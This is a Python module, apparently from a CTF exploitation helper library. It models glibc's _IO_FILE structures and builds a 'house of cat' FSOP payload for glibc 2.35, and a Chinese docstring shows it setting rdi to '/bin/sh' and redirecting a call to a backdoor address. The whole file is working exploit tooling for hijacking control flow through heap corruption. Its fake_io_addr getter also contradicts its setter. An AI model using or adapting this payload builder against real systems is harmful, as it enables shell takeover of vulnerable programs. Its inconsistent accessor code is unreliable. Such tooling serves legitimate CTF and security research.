from typing import Any
from pydantic import BaseModel
from pwn import flat

from ...context import context
from ...typing import p64

class IO_FILE(BaseModel):
    _flags: int = 0
    _IO_read_ptr: int = 0
    _IO_read_end: int = 0
    _IO_read_base: int = 0
    _IO_write_base: int = 0
    _IO_write_ptr: int = 0
    _IO_write_end: int = 0
    _IO_buf_base: int = 0
    _IO_buf_end: int = 0
    _IO_save_base: int = 0
    _IO_backup_base: int = 0
    _IO_save_end: int = 0
    _markers: int = 0
    _chain: int = 0
    _fileno: int = 0
    _flags2: int = 0
    _old_offset: int = 0
    _cur_column: int = 0
    _vtable_offset: int = 0
    _shortbuf: int = 0
    _lock: int = 0
    _offset: int = 0
    _codecvt: int = 0
    _wide_data: int = 0
    _freeres_list: int = 0
    _freeres_buf: int = 0
    _pad5: int = 0
    _mode: int = 0
    _unused2: bytes = b''

    def __bytes__(self) -> bytes:
        if context.arch != 'amd64':
            raise Exception(f'{self.__class__.__name__} is only supported on amd64')
        return flat({
            0: [
                self._flags,
                self._IO_read_ptr,
                self._IO_read_end,
                self._IO_read_base,
                self._IO_write_base,
                self._IO_write_ptr,
                self._IO_write_end,
                self._IO_buf_base,
                self._IO_buf_end,
                self._IO_save_base,
                self._IO_backup_base,
                self._IO_save_end,
                self._markers,
                self._chain,
                self._fileno.to_bytes(4, 'little') + self._flags2.to_bytes(4, 'little'),
                self._old_offset,
                (self._cur_column.to_bytes(2, 'little') + self._vtable_offset.to_bytes(1, 'little') + self._shortbuf.to_bytes(1, 'little')).ljust(8, b'\x00'),
                self._lock,
                self._offset,
                self._codecvt,
                self._wide_data,
                self._freeres_list,
                self._freeres_buf,
                self._pad5,
                self._mode.to_bytes(4, 'little')
            ],
            0xc4: self._unused2.ljust(20, b'\x00')
        })


class IO_FILE_plus(IO_FILE):
    vtable: int = 0

    def __bytes__(self) -> bytes:
        return flat(super().__bytes__().ljust(0xd8, b'\x00'), self.vtable)
    

class house_of_cat:
    """
    FSOP 版本的 house_of_cat，在 2.35 下测试通过，返回一个 fake_IO payload
        rdi: 仅能设置 rdi 指针所指向的内容
        rdx: rdx 寄存器内容
        fake_io_addr: fake_IO 的地址
        call_addr: 调用的地址
        vtable: 虚表地址，设置为 libc.sym['_IO_wfile_jumps'] + 0x30
        > 由于 libc 在设置 address 后形成一个新的拷贝，所以不能使用全局 libc

        e.g.
            cat = house_of_cat()
            cat.fake_io_addr = heap
            cat.rdi = b"/bin/sh\x00"
            cat.rdx = p64(0xcafec0de)
            cat.call_addr = p64(backd00r)
            cat.vtable = p64(libc.sym['_IO_wfile_jumps'] + 0x30)

            send(bytes(cat))
    """
    MAPPING = {
        "rdi": "_flags",
        "rdx": "_IO_backup_base",
        "fake_io_addr": "_wide_data",
        "call_addr": "_IO_save_end",
        # "writable": "_lock",
        "vtable": "vtable"
    }
    rdi: int = 0
    rdx: int = 0
    fake_io_addr: int = 0
    call_addr: int = 0
    # writable: int = 0  # seems no need
    vtable: int = 0

    def __init__(self):
        self.file = IO_FILE_plus()
        self.file._mode = 1  # mode <= 0 (_IO_flush_all_lockp)
        self.file._IO_save_base = 1  # mode == 0 (_IO_wfile_seekoff)
        self.file._IO_write_ptr = 1  # was_writing (_IO_wfile_seekoff)

    
    def __setattr__(self, __name: str, __value: Any) -> None:
        if __name in self.MAPPING:
            if __name == "fake_io_addr":
                self.file._wide_data = __value + 0x30  # rax1
            else:
                setattr(self.file, self.MAPPING[__name], __value)
        else:
            super().__setattr__(__name, __value)
    
    def __getattr__(self, __name: str) -> Any:
        if __name in self.MAPPING:
            if __name == "fake_io_addr":
                return self.file._IO_backup_base - 0xb0
            return getattr(self.file, self.MAPPING[__name])
        else:
            return super().__getattr__(__name)
        
    def __bytes__(self) -> bytes:
        return bytes(self.file).ljust(0x110, b'\x00') + p64(self.file._wide_data + 0x10)  # rax2
    
    def __call__(self, **kwds: Any) -> Any:
        for k, v in kwds.items():
            setattr(self, k, v)
        return self
